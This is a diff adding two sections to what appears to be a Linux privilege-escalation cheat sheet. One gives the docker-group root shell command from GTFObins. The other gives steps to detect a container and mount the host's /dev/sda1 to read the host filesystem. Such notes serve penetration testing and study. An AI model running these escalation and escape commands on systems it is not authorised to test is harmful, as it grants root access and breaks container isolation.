@@ -1436,6 +1436,41 @@ whoami
 root
 ```
 
+#### Docker Group
+
+First check what images we have available:
+
+```
+docker image ls
+```
+
+We can use the GTFObins command replacing the value `<alpine>` with one of the images listed above.
+
+```
+docker run -v /:/mnt --rm -it <THE_IMAGE_REPOSITORY_NAME> chroot /mnt sh
+```
+
+Returning a shell as root and navigate to /mnt:
+
+```
+cd /mnt
+```
+
+#### Docker Container
+
+Listing everything inside the '/' directory shows a .dockerenv file. This combined with the hostname of `<ID>` means we are likely running inside a docker container.
+
+Using the command `fdisk -l` we can list the hosts disks.
+
+We can then create a directory and attempt to mount **/dev/sda1** to it so we can see if we can browse the hosts file system.
+
+```
+mkdir /mnt/own
+mount /dev/sda1 /mnt/own
+cd /mnt/own
+ls /mnt/own/root
+```
+
 ### &#x20;LXC/LXD
 
 #### LXD Abuse
